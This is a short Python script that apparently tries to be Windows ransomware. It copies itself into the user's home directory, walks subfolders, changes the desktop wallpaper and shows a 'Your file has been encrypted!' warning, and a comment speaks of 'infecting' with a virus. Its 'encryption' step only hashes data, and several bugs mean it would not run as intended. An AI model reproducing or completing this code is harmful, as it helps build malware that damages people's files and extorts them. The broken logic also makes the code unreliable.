import shutil
import os
import hashlib
import ctypes


main_file_directory = os.getcwd()
user_name = os.getenv('username')
destination_directory = "C://Users//" + user_name
destination_directory_under = destination_directory
sha_256 = hashlib.sha256


def warning():
    wall_paper_file = "bg.jpg"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wall_paper_file , 3)
    ctypes.windll.user32.MessageBoxW(0, "Your file has been encrypted!", "Warning", 0)

def encryption(filename):
    h  = hashlib.sha256()
    b  = bytearray(128*1024)
    mv = memoryview(b)
    for n in filename:
        with open(filename, 'rb', buffering=0) as f:
            for n in iter(lambda : f.readinto(mv), 0):
                h.update(mv[:n])
    return h.hexdigest()


def file_finder(dirname):
    subfolders= [f.path for f in os.scandir(dirname) if f.is_dir()]
    for dirname in list(subfolders):
        subfolders.extend(file_finder(dirname))
    return subfolders


if main_file_directory is not destination_directory:
    shutil.copy(main_file_directory,destination_directory)
    exit()

elif main_file_directory is destination_directory:
    #start infecting the virus
    sub_directory_list = file_finder(main_file_directory)
    encryption(sub_directory_list)
